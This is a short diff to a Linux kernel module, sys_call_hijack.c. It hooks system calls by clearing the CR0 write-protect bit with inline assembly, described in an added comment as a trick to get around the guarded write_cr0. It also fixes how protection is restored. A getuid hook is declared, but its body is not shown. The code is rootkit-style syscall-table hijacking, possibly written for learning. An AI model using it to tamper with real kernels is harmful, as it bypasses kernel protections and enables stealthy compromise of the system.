@@ -1,5 +1,5 @@
 /*
-* sys_call_hijack.c - Puts hook on some syscalls
+* sys_call_hijack.c - Puts hook on syscall
 */
 
 #include <asm/cacheflush.h>
@@ -31,7 +31,10 @@ static void ** sc_table_address = (void **)0xffffffff820002a0;
 static sys_call_func_ptr_t g_original_func_ptr = 0;
 static unsigned long g_original_cr0;
 
-
+/* 
+	The orginal write_cr0 is protected and well guarded
+    This trick helps me overcome this probelm
+*/
 static inline void fast_write_cr0(unsigned long cr0)
 {
 	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
@@ -47,7 +50,7 @@ static void turn_off_write_protect(void)
 static void turn_on_write_protect(void)
 {
 	/* Write protect flag is the 16th bit in CR0 register */
-	fast_write_cr0(g_original_cr0());
+	fast_write_cr0(g_original_cr0);
 }
 
 asmlinkage long sc_getuid_hook(void)
